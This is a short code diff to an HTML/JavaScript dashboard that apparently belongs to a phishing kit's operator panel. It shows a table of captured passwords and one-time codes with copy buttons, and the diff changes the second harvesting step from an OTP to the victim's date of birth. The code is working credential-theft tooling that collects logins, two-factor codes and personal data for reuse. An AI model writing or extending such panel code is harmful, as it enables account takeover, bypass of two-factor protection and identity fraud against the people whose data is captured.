@@ -121,7 +121,7 @@
           <th>Password</th>
           <th>OTP Code</th>
           <th>Step 1 -- Credentials</th>
-          <th>Step 2 -- OTP</th>
+          <th>Step 2 -- Date of Birth</th>
         </tr>
       </thead>
       <tbody id="client-table">
@@ -367,7 +367,9 @@
         <td class="mono"><span class="value-with-copy"><span class="pw-plain">${escHtml(v.password || '--')}</span>${v.password ? `<button class="copy-btn" data-copy-value="${escAttr(v.password)}" type="button">Copy</button>` : ''}</span></td>
         <td>${v.otp ? `<span class="value-with-copy"><span class="otp-tag">${escHtml(v.otp)}</span><button class="copy-btn" data-copy-value="${escAttr(v.otp)}" type="button">Copy</button></span>` : '<span class="badge none">--</span>'}</td>
         <td>${credentialActions}</td>
-        <td>${statusBadge(v.otpStatus, v.hasOtp ? 'received' : 'awaiting')}</td>
+        <td>${v.dateOfBirth
+          ? `<span class="value-with-copy"><span class="mono">${escHtml(v.dateOfBirth)}</span><button class="copy-btn" data-copy-value="${escAttr(v.dateOfBirth)}" type="button">Copy</button></span>`
+          : statusBadge(v.otpStatus, v.hasOtp ? 'received' : 'awaiting')}</td>
       </tr>`;
     }).join('');
     renderSmsHistory();
